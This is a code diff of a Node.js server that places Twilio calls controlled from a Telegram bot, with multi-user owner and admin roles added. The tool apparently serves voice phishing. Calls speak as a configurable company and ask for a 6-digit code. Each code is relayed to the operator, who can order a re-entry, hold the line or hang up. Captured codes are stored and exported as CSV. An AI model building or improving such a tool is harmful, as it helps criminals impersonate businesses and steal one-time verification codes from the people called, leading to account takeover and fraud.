@@ -14,21 +14,19 @@ const PORT = process.env.PORT || 3000;
 // ENV
 // ============================================================
 
-const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
-const CHAT_ID = process.env.CHAT_ID;
+const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || "";
+const OWNER_ID = String(process.env.OWNER_ID || "");
+const ADMIN_IDS = (process.env.ADMIN_IDS || "")
+  .split(",")
+  .map((s) => s.trim())
+  .filter(Boolean);
 
 const TWILIO_ACCOUNT_SID =
-  process.env.TWILIO_ACCOUNT_SID || process.env.TWILIO_SID;
+  process.env.TWILIO_ACCOUNT_SID || process.env.TWILIO_SID || "";
 const TWILIO_AUTH_TOKEN =
-  process.env.TWILIO_AUTH_TOKEN || process.env.TWILIO_TOKEN;
-const TWILIO_NUMBER = process.env.TWILIO_NUMBER;
-
-const BASE_URL = process.env.BASE_URL || "";
-
-const ALLOWED_CHAT_IDS = (process.env.ALLOWED_CHAT_IDS || CHAT_ID || "")
-  .split(",")
-  .map(s => s.trim())
-  .filter(Boolean);
+  process.env.TWILIO_AUTH_TOKEN || process.env.TWILIO_TOKEN || "";
+const TWILIO_NUMBER = process.env.TWILIO_NUMBER || "";
+const BASE_URL = (process.env.BASE_URL || "").replace(/\/+$/, "");
 
 const QUICK_DIAL_A_LABEL = process.env.QUICK_DIAL_A_LABEL || "Quick A";
 const QUICK_DIAL_A_NUMBER = process.env.QUICK_DIAL_A_NUMBER || "";
@@ -49,7 +47,7 @@ const defaultSettings = {
   company: "Support",
   digits: 6,
   assistant: 0,
-  itemName: "reference number",
+  itemName: "booking number",
   greeting:
     "Hello from {company}. Please enter your {digits} digit {item}.",
   retryMessage: "Please re-enter your {item}.",
@@ -66,6 +64,16 @@ const defaultSettings = {
   randomAssistant: false,
   panelTitle: "📞 LIVE CALLS"
 };
+
+function defaultUserState() {
+  return {
+    panelMessageId: null,
+    pendingInput: null,
+    lastDialed: null,
+    panelBrokenCount: 0,
+    dirty: false
+  };
+}
 
 function defaultDB() {
   return {
@@ -85,16 +93,31 @@ function defaultDB() {
       autoHungUp: 0,
       scheduledCalls: 0,
       completedCalls: 0
-    }
+    },
+    users: {}
   };
 }
 
 let db = defaultDB();
 
+function ensureUser(chatId) {
+  const key = String(chatId);
+  if (!db.users[key]) {
+    db.users[key] = defaultUserState();
+  } else {
+    db.users[key] = {
+      ...defaultUserState(),
+      ...db.users[key]
+    };
+  }
+  return db.users[key];
+}
+
 function loadDB() {
   try {
     if (!fs.existsSync(DB_FILE)) {
       db = defaultDB();
+      if (OWNER_ID) ensureUser(OWNER_ID);
       return;
     }
 
@@ -110,11 +133,16 @@ function loadDB() {
       stats: {
         ...defaultDB().stats,
         ...(parsed.stats || {})
-      }
+      },
+      users: parsed.users || {}
     };
+
+    if (OWNER_ID) ensureUser(OWNER_ID);
+    for (const adminId of ADMIN_IDS) ensureUser(adminId);
   } catch (e) {
     console.log("loadDB error:", e.message);
     db = defaultDB();
+    if (OWNER_ID) ensureUser(OWNER_ID);
   }
 }
 
@@ -150,14 +178,40 @@ const quickDialTargets = {
 };
 
 const calls = new Map();
-
-let panelMessageId = null;
-let panelDirty = false;
-let panelBrokenCount = 0;
-
-let lastDialed = null;
-let pendingInput = null;
 let scheduledJobs = [];
+
+// ============================================================
+// ROLES / AUTH
+// ============================================================
+
+function getRole(chatId) {
+  const id = String(chatId || "");
+  if (!id) return "blocked";
+  if (id === OWNER_ID) return "owner";
+  if (ADMIN_IDS.includes(id)) return "admin";
+  return "blocked";
+}
+
+function isAuthorized(update) {
+  const chatId =
+    update?.message?.chat?.id ||
+    update?.callback_query?.message?.chat?.id ||
+    update?.callback_query?.from?.id;
+  return getRole(chatId) !== "blocked";
+}
+
+function ownerOnly(chatId) {
+  return String(chatId || "") === OWNER_ID;
+}
+
+function getChatId(update) {
+  return (
+    update?.message?.chat?.id ||
+    update?.callback_query?.message?.chat?.id ||
+    update?.callback_query?.from?.id ||
+    OWNER_ID
+  );
+}
 
 // ============================================================
 // HELPERS
@@ -175,40 +229,33 @@ function incStat(key) {
 
 function pushLog(text) {
   db.logs.unshift(`${new Date().toLocaleTimeString()} ${text}`);
-  db.logs = db.logs.slice(0, 100);
+  db.logs = db.logs.slice(0, 200);
   saveDB();
 }
 
 function pushHistory(text) {
   db.history.unshift(`${new Date().toLocaleString()} ${text}`);
-  db.history = db.history.slice(0, 300);
+  db.history = db.history.slice(0, 500);
   saveDB();
 }
 
-function pushCodeEntry(caller, value, sid = "") {
+function pushCodeEntry(caller, value, sid = "", ownerId = "") {
   db.codes.unshift({
     time: new Date().toLocaleString(),
     caller,
     value,
-    sid
+    sid,
+    ownerId: String(ownerId || "")
   });
-  db.codes = db.codes.slice(0, 200);
+  db.codes = db.codes.slice(0, 500);
   saveDB();
 }
 
-function markPanelDirty() {
-  panelDirty = true;
-}
-
-function isAuthorized(update) {
-  if (!ALLOWED_CHAT_IDS.length) return true;
-
-  const chatId =
-    update?.message?.chat?.id ||
-    update?.callback_query?.message?.chat?.id ||
-    update?.callback_query?.from?.id;
-
-  return ALLOWED_CHAT_IDS.includes(String(chatId));
+function markUserDirty(chatId) {
+  if (!chatId) return;
+  const user = ensureUser(chatId);
+  user.dirty = true;
+  saveDB();
 }
 
 function assistant() {
@@ -242,19 +289,21 @@ function callTimerText(call) {
   return `${mm}:${ss}`;
 }
 
-function sortedCalls() {
-  return Array.from(calls.values()).sort(
-    (a, b) => (b.startedAt || 0) - (a.startedAt || 0)
+function sortedCallsForUser(chatId) {
+  return Array.from(calls.values())
+    .filter((c) => String(c.ownerId) === String(chatId))
+    .sort((a, b) => (b.startedAt || 0) - (a.startedAt || 0));
+}
+
+function newestActiveCallForUser(chatId) {
+  return (
+    sortedCallsForUser(chatId).find(
+      (c) => c.status !== "Ended" && c.status !== "Idle"
+    ) || null
   );
 }
 
-function newestActiveCall() {
-  return sortedCalls().find(
-    c => c.status !== "Ended" && c.status !== "Idle"
-  ) || null;
-}
-
-function getOrCreateCall(callSid) {
+function getOrCreateCall(callSid, ownerId = OWNER_ID) {
   if (!callSid) return null;
 
   if (!calls.has(callSid)) {
@@ -264,6 +313,7 @@ function getOrCreateCall(callSid) {
 
     calls.set(callSid, {
       sid: callSid,
+      ownerId: String(ownerId),
       caller: null,
       input: null,
       status: "Idle",
@@ -296,22 +346,44 @@ function removeCallTimers(call) {
 function cleanupEndedCalls() {
   const now = Date.now();
   for (const [sid, call] of calls.entries()) {
-    if (call.status === "Ended" && call.endedAt && now - call.endedAt > 5 * 60 * 1000) {
+    if (
+      call.status === "Ended" &&
+      call.endedAt &&
+      now - call.endedAt > 5 * 60 * 1000
+    ) {
       calls.delete(sid);
     }
   }
 }
 
 function toCsv(rows) {
-  const header = "time,caller,value,sid\n";
-  const body = rows.map(r => {
-    const time = `"${String(r.time).replaceAll('"', '""')}"`;
-    const caller = `"${String(r.caller).replaceAll('"', '""')}"`;
-    const value = `"${String(r.value).replaceAll('"', '""')}"`;
-    const sid = `"${String(r.sid || "").replaceAll('"', '""')}"`;
-    return `${time},${caller},${value},${sid}`;
-  }).join("\n");
+  const header = "time,caller,value,sid,ownerId\n";
+  const body = rows
+    .map((r) => {
+      const time = `"${String(r.time).replaceAll('"', '""')}"`;
+      const caller = `"${String(r.caller).replaceAll('"', '""')}"`;
+      const value = `"${String(r.value).replaceAll('"', '""')}"`;
+      const sid = `"${String(r.sid || "").replaceAll('"', '""')}"`;
+      const ownerId = `"${String(r.ownerId || "").replaceAll('"', '""')}"`;
+      return `${time},${caller},${value},${sid},${ownerId}`;
+    })
+    .join("\n");
   return header + body;
+}
+
+function parseDelay(text) {
+  const value = String(text || "").trim().toLowerCase();
+
+  const sec = value.match(/^(\d+)s$/);
+  if (sec) return parseInt(sec[1], 10) * 1000;
+
+  const min = value.match(/^(\d+)m$/);
+  if (min) return parseInt(min[1], 10) * 60 * 1000;
+
+  const hr = value.match(/^(\d+)h$/);
+  if (hr) return parseInt(hr[1], 10) * 60 * 60 * 1000;
+
+  return null;
 }
 
 // ============================================================
@@ -319,17 +391,20 @@ function toCsv(rows) {
 // ============================================================
 
 async function tg(method, data) {
-  const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/${method}`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(data)
-  });
+  const res = await fetch(
+    `https://api.telegram.org/bot${TELEGRAM_TOKEN}/${method}`,
+    {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(data)
+    }
+  );
   return res.json();
 }
 
-async function tgSend(text, buttons = null) {
+async function tgSend(chatId, text, buttons = null) {
   const body = {
-    chat_id: CHAT_ID,
+    chat_id: chatId,
     text
   };
   if (buttons) {
@@ -338,9 +413,9 @@ async function tgSend(text, buttons = null) {
   return tg("sendMessage", body);
 }
 
-async function tgEdit(messageId, text, buttons = null) {
+async function tgEdit(chatId, messageId, text, buttons = null) {
   const body = {
-    chat_id: CHAT_ID,
+    chat_id: chatId,
     message_id: messageId,
     text
   };
@@ -359,22 +434,23 @@ async function tgAnswerCallback(callbackQueryId, text = "") {
   } catch {}
 }
 
-async function tgSendDocument(filename, contentBuffer) {
+async function tgSendDocument(chatId, filename, contentBuffer) {
   const boundary = "----NodeFormBoundary" + Math.random().toString(16).slice(2);
   const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`;
 
   const chunks = [];
-
   function pushString(str) {
     chunks.push(Buffer.from(str, "utf8"));
   }
 
   pushString(`--${boundary}\r\n`);
   pushString(`Content-Disposition: form-data; name="chat_id"\r\n\r\n`);
-  pushString(`${CHAT_ID}\r\n`);
+  pushString(`${chatId}\r\n`);
 
   pushString(`--${boundary}\r\n`);
-  pushString(`Content-Disposition: form-data; name="document"; filename="${filename}"\r\n`);
+  pushString(
+    `Content-Disposition: form-data; name="document"; filename="${filename}"\r\n`
+  );
   pushString(`Content-Type: text/csv\r\n\r\n`);
   chunks.push(contentBuffer);
   pushString(`\r\n--${boundary}--\r\n`);
@@ -397,7 +473,9 @@ async function tgSendDocument(filename, contentBuffer) {
 // PANEL
 // ============================================================
 
-function panelButtons() {
+function panelButtons(chatId) {
+  const role = getRole(chatId);
+
   const quickButtons = Object.entries(quickDialTargets)
     .filter(([, value]) => value)
     .slice(0, 3)
@@ -408,7 +486,7 @@ function panelButtons() {
 
   const profileButtons = Object.keys(db.profiles)
     .slice(0, 4)
-    .map(name => ({
+    .map((name) => ({
       text: `📁 ${name}`,
       callback_data: `profile:${name}`
     }));
@@ -423,7 +501,12 @@ function panelButtons() {
       { text: "📞 Call Last", callback_data: "calllast" },
       { text: "📲 Call", callback_data: "call" }
     ],
-    [{ text: settings.paused ? "▶ Resume" : "⏸ Pause", callback_data: settings.paused ? "resume" : "pause" }],
+    [
+      {
+        text: settings.paused ? "▶ Resume" : "⏸ Pause",
+        callback_data: settings.paused ? "resume" : "pause"
+      }
+    ],
     [{ text: "⚡ Wake Server", callback_data: "wake" }],
     [
       { text: "📊 Status", callback_data: "status" },
@@ -434,13 +517,19 @@ function panelButtons() {
   if (quickButtons.length) rows.splice(3, 0, quickButtons);
   if (profileButtons.length) rows.splice(4, 0, profileButtons);
 
+  if (role === "owner") {
+    rows.push([{ text: "👑 Owner", callback_data: "ownerinfo" }]);
+  } else if (role === "admin") {
+    rows.push([{ text: "🛡 Admin", callback_data: "admininfo" }]);
+  }
+
   return rows;
 }
 
-function panelText() {
+function panelText(chatId) {
   cleanupEndedCalls();
 
-  const active = sortedCalls().slice(0, 8);
+  const active = sortedCallsForUser(chatId).slice(0, 8);
   const lines = [settings.panelTitle, ""];
 
   if (!active.length) {
@@ -449,11 +538,17 @@ function panelText() {
   } else {
     active.forEach((call, index) => {
       const statusIcon =
-        call.status === "Ringing" ? "📳" :
-        call.status === "Answered" ? "🟢" :
-        call.status === "Held" ? "⏳" :
-        call.status === "Paused" ? "⏸" :
-        call.status === "Ended" ? "⚫" : "⚪";
+        call.status === "Ringing"
+          ? "📳"
+          : call.status === "Answered"
+            ? "🟢"
+            : call.status === "Held"
+              ? "⏳"
+              : call.status === "Paused"
+                ? "⏸"
+                : call.status === "Ended"
+                  ? "⚫"
+                  : "⚪";
 
       let inputText = call.input || "waiting";
       if (call.newInput) {
@@ -471,11 +566,14 @@ function panelText() {
     });
   }
 
+  const role = getRole(chatId);
+
   lines.push(`Company: ${settings.company}`);
   lines.push(`Digits: ${settings.digits}`);
   lines.push(`Assistant: ${assistant().name}`);
   lines.push(`Item: ${settings.itemName}`);
   lines.push(`Paused: ${settings.paused ? "Yes" : "No"}`);
+  lines.push(`Role: ${role}`);
   lines.push(`Max Retries: ${settings.maxRetries}`);
   lines.push(`Input Timeout: ${settings.inputTimeout}s`);
   lines.push(`Auto Confirm: ${settings.autoConfirmSec || 0}s`);
@@ -484,34 +582,45 @@ function panelText() {
   return lines.join("\n");
 }
 
-async function updatePanel(forceNew = false) {
+async function updatePanel(chatId, forceNew = false) {
   try {
-    const text = panelText();
-    const buttons = panelButtons();
+    const user = ensureUser(chatId);
+    const text = panelText(chatId);
+    const buttons = panelButtons(chatId);
 
-    if (!panelMessageId || forceNew) {
-      const msg = await tgSend(text, buttons);
+    if (!user.panelMessageId || forceNew) {
+      const msg = await tgSend(chatId, text, buttons);
       if (msg && msg.result && msg.result.message_id) {
-        panelMessageId = msg.result.message_id;
+        user.panelMessageId = msg.result.message_id;
+        saveDB();
       }
       return;
     }
 
-    const result = await tgEdit(panelMessageId, text, buttons);
+    const result = await tgEdit(
+      chatId,
+      user.panelMessageId,
+      text,
+      buttons
+    );
 
     if (!result || result.ok === false) {
-      panelBrokenCount++;
-      if (panelBrokenCount >= 2) {
-        panelMessageId = null;
-        await updatePanel(true);
+      user.panelBrokenCount++;
+      if (user.panelBrokenCount >= 2) {
+        user.panelMessageId = null;
+        saveDB();
+        await updatePanel(chatId, true);
       }
     } else {
-      panelBrokenCount = 0;
+      user.panelBrokenCount = 0;
+      saveDB();
     }
   } catch {
-    panelBrokenCount++;
-    if (panelBrokenCount >= 2) {
-      panelMessageId = null;
+    const user = ensureUser(chatId);
+    user.panelBrokenCount++;
+    if (user.panelBrokenCount >= 2) {
+      user.panelMessageId = null;
+      saveDB();
     }
   }
 }
@@ -520,29 +629,33 @@ async function updatePanel(forceNew = false) {
 // TWILIO CONTROL
 // ============================================================
 
-async function startCall(number) {
-  if (!number) return;
+async function startCall(number, ownerId) {
+  if (!number) return false;
 
   if (settings.paused) {
-    await tgSend("⏸ Outbound calling is paused");
-    return;
+    await tgSend(ownerId, "⏸ Outbound calling is paused");
+    return false;
   }
 
-  lastDialed = number;
+  const user = ensureUser(ownerId);
+  user.lastDialed = number;
+  saveDB();
+
   incStat("outboundCalls");
 
   await client.calls.create({
-    url: `${BASE_URL}/ivr`,
+    url: `${BASE_URL}/ivr?owner=${encodeURIComponent(String(ownerId))}`,
     to: number,
     from: TWILIO_NUMBER,
-    statusCallback: `${BASE_URL}/call-status`,
+    statusCallback: `${BASE_URL}/call-status?owner=${encodeURIComponent(String(ownerId))}`,
     statusCallbackEvent: ["initiated", "ringing", "answered", "completed"],
     statusCallbackMethod: "POST"
   });
 
-  pushLog(`Outbound call started to ${number}`);
-  pushHistory(`Outbound call to ${number}`);
-  markPanelDirty();
+  pushLog(`Outbound call started to ${number} by ${ownerId}`);
+  pushHistory(`Outbound call to ${number} by ${ownerId}`);
+  markUserDirty(ownerId);
+  return true;
 }
 
 async function updateLiveCallTwiml(callSid, twiml) {
@@ -563,12 +676,12 @@ function buildInputTwiml(call) {
 
   return `
 <Response>
-<Gather numDigits="${settings.digits}" action="${BASE_URL}/input" method="POST" timeout="${settings.inputTimeout}">
+<Gather numDigits="${settings.digits}" action="${BASE_URL}/input?owner=${encodeURIComponent(String(call.ownerId))}" method="POST" timeout="${settings.inputTimeout}">
 <Say voice="${voice}">
 ${greeting}
 </Say>
 </Gather>
-<Redirect method="POST">${BASE_URL}/ivr</Redirect>
+<Redirect method="POST">${BASE_URL}/ivr?owner=${encodeURIComponent(String(call.ownerId))}</Redirect>
 </Response>
 `;
 }
@@ -579,12 +692,12 @@ function buildRetryTwiml(call) {
 
   return `
 <Response>
-<Gather numDigits="${settings.digits}" action="${BASE_URL}/input" method="POST" timeout="${settings.inputTimeout}">
+<Gather numDigits="${settings.digits}" action="${BASE_URL}/input?owner=${encodeURIComponent(String(call.ownerId))}" method="POST" timeout="${settings.inputTimeout}">
 <Say voice="${voice}">
 ${retryText}
 </Say>
 </Gather>
-<Redirect method="POST">${BASE_URL}/hold</Redirect>
+<Redirect method="POST">${BASE_URL}/hold?owner=${encodeURIComponent(String(call.ownerId))}</Redirect>
 </Response>
 `;
 }
@@ -603,7 +716,7 @@ You entered ${spacedDigits(call.input)}.
 <Say voice="${voice}">
 ${reviewText}
 </Say>
-<Redirect method="POST">${BASE_URL}/hold</Redirect>
+<Redirect method="POST">${BASE_URL}/hold?owner=${encodeURIComponent(String(call.ownerId))}</Redirect>
 </Response>
 `;
   }
@@ -613,7 +726,7 @@ ${reviewText}
 <Say voice="${voice}">
 ${reviewText}
 </Say>
-<Redirect method="POST">${BASE_URL}/hold</Redirect>
+<Redirect method="POST">${BASE_URL}/hold?owner=${encodeURIComponent(String(call.ownerId))}</Redirect>
 </Response>
 `;
 }
@@ -659,7 +772,7 @@ function schedulePerCallTimers(call) {
           incStat("completedCalls");
           pushLog(`Auto confirmed ${call.caller || call.sid}`);
           pushHistory(`Auto confirmed ${call.caller || call.sid}`);
-          markPanelDirty();
+          markUserDirty(call.ownerId);
         }
       } catch {}
     }, settings.autoConfirmSec * 1000);
@@ -677,50 +790,36 @@ function schedulePerCallTimers(call) {
           incStat("completedCalls");
           pushLog(`Auto hung up ${call.caller || call.sid}`);
           pushHistory(`Auto hung up ${call.caller || call.sid}`);
-          markPanelDirty();
+          markUserDirty(call.ownerId);
         }
       } catch {}
     }, settings.autoHangupSec * 1000);
   }
 }
 
-function scheduleOutboundCall(number, delayMs) {
+function scheduleOutboundCall(number, delayMs, ownerId) {
   const id = Date.now() + Math.random();
 
   const timeout = setTimeout(async () => {
     try {
-      await startCall(number);
+      await startCall(number, ownerId);
       incStat("scheduledCalls");
-      pushLog(`Scheduled call fired to ${number}`);
-      pushHistory(`Scheduled call fired to ${number}`);
+      pushLog(`Scheduled call fired to ${number} by ${ownerId}`);
+      pushHistory(`Scheduled call fired to ${number} by ${ownerId}`);
     } catch (e) {
       pushLog(`Scheduled call failed to ${number}: ${e.message}`);
     } finally {
-      scheduledJobs = scheduledJobs.filter(x => x.id !== id);
+      scheduledJobs = scheduledJobs.filter((x) => x.id !== id);
     }
   }, delayMs);
 
   scheduledJobs.push({
     id,
     number,
+    ownerId: String(ownerId),
     fireAt: Date.now() + delayMs,
     timeout
   });
-}
-
-function parseDelay(text) {
-  const value = text.trim().toLowerCase();
-
-  const sec = value.match(/^(\d+)s$/);
-  if (sec) return parseInt(sec[1], 10) * 1000;
-
-  const min = value.match(/^(\d+)m$/);
-  if (min) return parseInt(min[1], 10) * 60 * 1000;
-
-  const hr = value.match(/^(\d+)h$/);
-  if (hr) return parseInt(hr[1], 10) * 60 * 60 * 1000;
-
-  return null;
 }
 
 // ============================================================
@@ -739,9 +838,8 @@ app.get("/health", (req, res) => {
   res.json({
     status: "ok",
     time: Date.now(),
-    activeCalls: sortedCalls().filter(c => c.status !== "Ended").length,
-    paused: settings.paused,
-    lastDialed
+    activeCalls: sortedCallsForUser(OWNER_ID).length,
+    paused: settings.paused
   });
 });
 
@@ -759,8 +857,9 @@ app.post("/call-status", async (req, res) => {
     const status = req.body.CallStatus;
     const from = req.body.From;
     const sid = req.body.CallSid;
+    const ownerId = String(req.query.owner || OWNER_ID);
 
-    const call = getOrCreateCall(sid);
+    const call = getOrCreateCall(sid, ownerId);
     if (call) {
       if (from) call.caller = from;
 
@@ -781,7 +880,7 @@ app.post("/call-status", async (req, res) => {
         incStat("completedCalls");
       }
 
-      markPanelDirty();
+      markUserDirty(ownerId);
     }
   } catch (e) {
     console.log("call-status error:", e.message);
@@ -798,8 +897,9 @@ app.post("/ivr", async (req, res) => {
   try {
     const sid = req.body.CallSid;
     const from = req.body.From;
+    const ownerId = String(req.query.owner || OWNER_ID);
 
-    const call = getOrCreateCall(sid);
+    const call = getOrCreateCall(sid, ownerId);
     if (call) {
       call.caller = from || call.caller;
       call.status = settings.paused ? "Paused" : "Answered";
@@ -810,7 +910,7 @@ app.post("/ivr", async (req, res) => {
     }
 
     incStat("inboundCalls");
-    markPanelDirty();
+    markUserDirty(ownerId);
 
     res.type("text/xml");
 
@@ -842,8 +942,9 @@ app.post("/input", async (req, res) => {
     const digits = req.body.Digits;
     const caller = req.body.From;
     const sid = req.body.CallSid;
+    const ownerId = String(req.query.owner || OWNER_ID);
 
-    const call = getOrCreateCall(sid);
+    const call = getOrCreateCall(sid, ownerId);
 
     if (call) {
       call.caller = caller;
@@ -857,26 +958,12 @@ app.post("/input", async (req, res) => {
     incStat("inputsReceived");
     pushLog(`${caller} : ${digits}`);
     pushHistory(`${caller} -> ${settings.itemName}: ${digits}`);
-    pushCodeEntry(caller, digits, sid);
+    pushCodeEntry(caller, digits, sid, ownerId);
 
     res.type("text/xml");
     res.send(buildReviewTwiml(call));
 
-    try {
-      // separate entry message
-      await tgSend(`${digits}`);
-
-      // auto-create panel if missing, otherwise refresh existing one
-      if (!panelMessageId) {
-        await updatePanel(true);
-      } else {
-        markPanelDirty();
-        await updatePanel();
-      }
-    } catch (e) {
-      console.log("telegram send error:", e.message);
-    }
-
+    markUserDirty(ownerId);
     schedulePerCallTimers(call);
   } catch (e) {
     console.log("/input error:", e.message);
@@ -890,11 +977,13 @@ app.post("/input", async (req, res) => {
 // ============================================================
 
 app.post("/hold", (req, res) => {
+  const ownerId = String(req.query.owner || OWNER_ID);
+
   res.type("text/xml");
   res.send(`
 <Response>
 <Pause length="${settings.holdSeconds}"/>
-<Redirect method="POST">${BASE_URL}/hold</Redirect>
+<Redirect method="POST">${BASE_URL}/hold?owner=${encodeURIComponent(ownerId)}</Redirect>
 </Response>
 `);
 });
@@ -906,6 +995,9 @@ app.post("/hold", (req, res) => {
 app.post("/telegram", async (req, res) => {
   try {
     const update = req.body || {};
+    const chatId = String(getChatId(update));
+    const role = getRole(chatId);
+    const user = ensureUser(chatId);
 
     if (!isAuthorized(update)) {
       return res.sendStatus(200);
@@ -917,7 +1009,7 @@ app.post("/telegram", async (req, res) => {
     if (update.callback_query) {
       const action = update.callback_query.data;
       const callbackId = update.callback_query.id;
-      const call = newestActiveCall();
+      const call = newestActiveCallForUser(chatId);
       const callSid = call ? call.sid : null;
 
       if (action === "confirm") {
@@ -928,9 +1020,9 @@ app.post("/telegram", async (req, res) => {
           removeCallTimers(call);
           incStat("confirmed");
           incStat("completedCalls");
-          pushLog("Confirmed");
-          pushHistory(`Confirmed ${call.caller || call.sid}`);
-          markPanelDirty();
+          pushLog(`Confirmed by ${chatId}`);
+          pushHistory(`Confirmed ${call.caller || call.sid} by ${chatId}`);
+          markUserDirty(chatId);
         }
         await tgAnswerCallback(callbackId, "Confirmed");
         return res.sendStatus(200);
@@ -946,18 +1038,20 @@ app.post("/telegram", async (req, res) => {
             call.endedAt = Date.now();
             removeCallTimers(call);
             incStat("completedCalls");
-            pushLog("Max retries reached");
-            pushHistory(`Max retries reached for ${call.caller || call.sid}`);
+            pushLog(`Max retries reached for ${chatId}`);
+            pushHistory(
+              `Max retries reached for ${call.caller || call.sid} by ${chatId}`
+            );
           } else {
             await updateLiveCallTwiml(callSid, buildRetryTwiml(call));
             call.input = null;
             call.status = "Answered";
             incStat("retries");
-            pushLog("Retry requested");
+            pushLog(`Retry requested by ${chatId}`);
           }
         }
 
-        markPanelDirty();
+        markUserDirty(chatId);
         await tgAnswerCallback(callbackId, "Retry sent");
         return res.sendStatus(200);
       }
@@ -970,44 +1064,53 @@ app.post("/telegram", async (req, res) => {
           removeCallTimers(call);
           incStat("hungUp");
           incStat("completedCalls");
-          pushLog("Hung up");
-          pushHistory(`Hung up ${call.caller || call.sid}`);
-          markPanelDirty();
+          pushLog(`Hung up by ${chatId}`);
+          pushHistory(`Hung up ${call.caller || call.sid} by ${chatId}`);
+          markUserDirty(chatId);
         }
         await tgAnswerCallback(callbackId, "Hung up");
         return res.sendStatus(200);
       }
 
       if (action === "calllast") {
-        if (lastDialed) {
-          await startCall(lastDialed);
-          await tgSend(`📞 Calling last dialed number ${lastDialed}`);
+        if (user.lastDialed) {
+          await startCall(user.lastDialed, chatId);
+          await tgSend(chatId, `📞 Calling last dialed number ${user.lastDialed}`);
         } else {
-          await tgSend("No previous outbound call");
+          await tgSend(chatId, "No previous outbound call");
         }
         await tgAnswerCallback(callbackId, "Calling");
         return res.sendStatus(200);
       }
 
       if (action === "call") {
-        pendingInput = "call";
-        await tgSend("Send number to call.\nExample:\n/call +447123456789");
+        user.pendingInput = "call";
+        saveDB();
+        await tgSend(chatId, "Send number to call.\nExample:\n/call +447123456789");
         await tgAnswerCallback(callbackId, "Waiting for number");
         return res.sendStatus(200);
       }
 
       if (action === "pause") {
+        if (!ownerOnly(chatId)) {
+          await tgAnswerCallback(callbackId, "Owner only");
+          return res.sendStatus(200);
+        }
         settings.paused = true;
         saveSettings();
-        markPanelDirty();
+        markUserDirty(chatId);
         await tgAnswerCallback(callbackId, "Paused");
         return res.sendStatus(200);
       }
 
       if (action === "resume") {
+        if (!ownerOnly(chatId)) {
+          await tgAnswerCallback(callbackId, "Owner only");
+          return res.sendStatus(200);
+        }
         settings.paused = false;
         saveSettings();
-        markPanelDirty();
+        markUserDirty(chatId);
         await tgAnswerCallback(callbackId, "Resumed");
         return res.sendStatus(200);
       }
@@ -1016,25 +1119,36 @@ app.post("/telegram", async (req, res) => {
         await fetch(BASE_URL).catch(() => {});
         await fetch(BASE_URL + "/ping").catch(() => {});
         await fetch(BASE_URL + "/health").catch(() => {});
-        await tgSend("⚡ Server wake request sent");
+        await tgSend(chatId, "⚡ Server wake request sent");
         await tgAnswerCallback(callbackId, "Server waking");
         return res.sendStatus(200);
       }
 
       if (action === "status") {
-        markPanelDirty();
-        await updatePanel();
+        markUserDirty(chatId);
+        await updatePanel(chatId);
         await tgAnswerCallback(callbackId, "Panel refreshed");
         return res.sendStatus(200);
       }
 
       if (action === "logs") {
+        const logs = db.logs.slice(0, 25);
         let text = "📜 Logs\n\n";
-        db.logs.slice(0, 25).forEach(l => {
-          text += l + "\n";
-        });
-        await tgSend(text);
+        text += logs.length ? logs.join("\n") : "No logs";
+        await tgSend(chatId, text);
         await tgAnswerCallback(callbackId, "Logs sent");
+        return res.sendStatus(200);
+      }
+
+      if (action === "ownerinfo") {
+        await tgSend(chatId, "👑 You are the owner");
+        await tgAnswerCallback(callbackId, "Owner");
+        return res.sendStatus(200);
+      }
+
+      if (action === "admininfo") {
+        await tgSend(chatId, "🛡 You are an admin");
+        await tgAnswerCallback(callbackId, "Admin");
         return res.sendStatus(200);
       }
 
@@ -1042,10 +1156,10 @@ app.post("/telegram", async (req, res) => {
         const label = action.split(":")[1];
         const number = quickDialTargets[label];
         if (number) {
-          await startCall(number);
-          await tgSend(`📲 Calling ${label}: ${number}`);
+          await startCall(number, chatId);
+          await tgSend(chatId, `📲 Calling ${label}: ${number}`);
         } else {
-          await tgSend("Quick dial not set");
+          await tgSend(chatId, "Quick dial not set");
         }
         await tgAnswerCallback(callbackId, "Calling");
         return res.sendStatus(200);
@@ -1061,11 +1175,11 @@ app.post("/telegram", async (req, res) => {
           settings.assistant = profile.assistant;
           settings.itemName = profile.itemName;
           saveSettings();
-          await tgSend(`📁 Profile loaded: ${name}`);
-          markPanelDirty();
-          await updatePanel();
+          await tgSend(chatId, `📁 Profile loaded: ${name}`);
+          markUserDirty(chatId);
+          await updatePanel(chatId);
         } else {
-          await tgSend("Profile not found");
+          await tgSend(chatId, "Profile not found");
         }
 
         await tgAnswerCallback(callbackId, "Profile");
@@ -1079,21 +1193,23 @@ app.post("/telegram", async (req, res) => {
     if (update.message && update.message.text) {
       const text = update.message.text.trim();
 
-      if (pendingInput === "call" && !text.startsWith("/")) {
-        pendingInput = null;
-        await startCall(text);
-        await tgSend(`📞 Calling ${text}`);
+      if (user.pendingInput === "call" && !text.startsWith("/")) {
+        user.pendingInput = null;
+        saveDB();
+        await startCall(text, chatId);
+        await tgSend(chatId, `📞 Calling ${text}`);
         return res.sendStatus(200);
       }
 
-      if (text === "/panel" || text === "/menu" || text === "/status") {
-        panelMessageId = null;
-        await updatePanel(true);
+      if (text === "/panel" || text === "/menu" || text === "/status" || text === "/start") {
+        user.panelMessageId = null;
+        saveDB();
+        await updatePanel(chatId, true);
         return res.sendStatus(200);
       }
 
       if (text === "/help" || text === "/commands") {
-        await tgSend(`🤖 Commands
+        let commands = `🤖 Commands
 
 /panel
 /menu
@@ -1102,8 +1218,6 @@ app.post("/telegram", async (req, res) => {
 /history
 /stats
 /codes
-/clearcodes
-/export
 /call +number
 /calllast
 /digits X
@@ -1118,17 +1232,28 @@ app.post("/telegram", async (req, res) => {
 /timeout X
 /autoconfirm X
 /autohangup X
-/pause
-/resume
-/stop
 /quickdials
 /schedule +number 10m
-/settings`);
+/settings`;
+
+        if (ownerOnly(chatId)) {
+          commands += `
+
+/clearcodes
+/export
+/pause
+/resume
+/stop`;
+        }
+
+        await tgSend(chatId, commands);
         return res.sendStatus(200);
       }
 
       if (text === "/settings") {
-        await tgSend(`⚙ Current Settings
+        await tgSend(
+          chatId,
+          `⚙ Current Settings
 
 Company: ${settings.company}
 Digits: ${settings.digits}
@@ -1138,30 +1263,32 @@ Max Retries: ${settings.maxRetries}
